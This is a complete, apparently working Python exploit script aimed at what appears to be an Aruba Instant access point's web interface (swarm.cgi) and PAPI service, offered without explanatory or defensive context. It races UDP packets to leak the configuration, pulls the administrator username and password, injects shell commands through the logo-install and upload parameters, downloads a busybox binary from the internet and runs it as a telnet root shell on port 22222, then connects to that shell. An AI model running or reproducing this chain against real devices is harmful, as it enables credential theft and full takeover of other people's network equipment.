import socket
import sys
import struct
import time
import threading
import urllib3
import re
import telnetlib
import xml.etree.ElementTree as ET
import requests
 
urllib3.disable_warnings()
 
CONTINUE_RACE = True
SNPRINTF_CREATEFILE_MAX_LENGTH = 245
 
 
def race_papi_message(ip):
 
    global CONTINUE_RACE
 
    payload = b"\x49\x72"
    payload += b"\x00\x03"
    payload += b"\x7F\x00\x00\x01"
    payload += b"\x7F\x00\x00\x01"
    payload += b"\x00\x00"
    payload += b"\x00\x00"
    payload += b"\x3B\x7E"
    payload += b"\x41\x41"
    payload += b"\x04\x22"
    payload += b"\x00\x00"
    payload += b"\x02\x00"
    payload += b"\x00\x00"
    payload += b"\x00" * 12 * 4
    text_to_send = bytes()
    for i in "msg_ref 3000 /tmp/cfg-plaintext\x00":
        text_to_send += struct.pack("B", int(ord(i)) ^ 0x93)
 
    packet = payload + text_to_send
 
    while CONTINUE_RACE:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((ip, 8211))
        s.send(packet)
        s.close()
        time.sleep(0.004)
 
 
def find_credentials(text):
    res = re.search("mgmt-user .*", text)[0]
    res = res.split(" ")
    return (res[1], res[2])
 
 
def login(ip, username, password):
    login_data = {
            "opcode": "login",
            "user": username,
            "passwd": password,
            "refresh": "false",
    }
    res = requests.post("https://{}:4343/swarm.cgi".format(ip), data=login_data, verify=False)
 
    root = ET.fromstring(res.text)
    return root.find("./data[@name='sid']").text
 
 
def create_directory(ip, sid):
    request_data = "opcode=config&ip=127.0.0.1&cmd='end%20%0Aapply%20cplogo-install%20\"https://{ip}:4343/%09--directory-prefix%09/tmp/oper_/%09#\"'&refresh=false&sid={sid}&nocache=0.23759201691110987&=".format(ip=ip, sid=sid)
    res = requests.post("https://{}:4343/swarm.cgi".format(ip), data=request_data, verify=False)
    if "/tmp/oper_" in res.text:
        print("[+] Successfully created /tmp/oper_/ directory :)")
        return True
    else:
        print("[-] Failed creating /tmp/oper_/ directory")
        return False
 
 
def prepare_upload_id(command):
    base_payload = "/../../etc/httpd/"
    cmd_len = len(command)
    padding_len = SNPRINTF_CREATEFILE_MAX_LENGTH - cmd_len - len(base_payload) - 8  # for the .gz at the end and the '; + spaces
    if padding_len < 0:
        print("[-] Command too long length:{}".format(padding_len))
        exit(1)
    return base_payload + ('/' * (padding_len - 1)) + 'A' + "'; {} #.gz".format(command)    
 
 
def create_file(ip, command):
    upload_id = prepare_upload_id(command)
    requests.post("https://{}:4343/swarm.cgi".format(ip), data={"opcode": "cp-upload", "file_type": "logo", "upload_id": upload_id, "sid": "basdfbsfbsfb"}, files={"file": "test2"}, verify=False)
 
 
def run_command(ip, command):
    print("[*] Executing telnet")
    command = command.replace("?", "%3F")
    command = command.replace("#", "\\\\x23")
    s = requests.Session()
    req = requests.Request('GET', "https://{}:4343/A';%20{}%20%23".format(ip, command))
    prep = req.prepare()
    response = s.send(prep, verify=False)
    return response.text
 
def build_command(command):
    command = command.replace("/", "\\\\x2F")
    command = command.replace("#", "\\\\x23")
    command = command.replace("\"", "\\\"")
    command = command.replace("`", "\`")
    final_command = "echo -e \"{}\"|sh".format(command)
    return final_command
 
def telnet_connect(router_ip):
    print("[*] Connecting to telnet")
    with telnetlib.Telnet(router_ip, 22222) as tn:
        tn.write(b"rm /etc/httpd/A*sh*.gz\n")
        tn.interact()
 
 
def main():
 
    global CONTINUE_RACE
 
    ip = sys.argv[1]
 
    print("[*] Starting the PAPI race thread")
    papi_thread = threading.Thread(target=race_papi_message, args=(ip, ))
    papi_thread.start()
 
    while CONTINUE_RACE:
        time.sleep(0.1)
        res = requests.get("https://{}:4343/swarm.cgi?opcode=single_signon&key=AAAA&ip=%20127.0.0.1".format(ip), timeout=3, verify=False)
        if "version" in res.text:
            print("[+] Successfully leaked the password from config")
            CONTINUE_RACE = False
 
    file_content = re.findall("var SESSION_ID = '(.*?)';", res.text, re.S)[0]
    user, password = find_credentials(file_content)
 
    print("[+] Successfully extracted username: {} and password: {}".format(user, password))
    sid = login(ip, user, password)
    print("[*] SID generated: {}".format(sid))
 
    command = """cd /tmp;/usr/sbin/wget https://busybox.net/downloads/binaries/1.21.1/busybox-armv5l --no-check-certificate -O telnetd;chmod +x telnetd;./telnetd -p 22222 -l sh"""
    final_command = build_command(command)
 
    if not create_directory(ip, sid):
        return
 
    print("[*] Creating malicious file in /etc/httpd/")
    create_file(ip, final_command)
    print(run_command(ip, final_command))
    time.sleep(1) # Sleeping waiting for telnet.
    telnet_connect(ip)
 
 
if __name__ == "__main__":
    main()
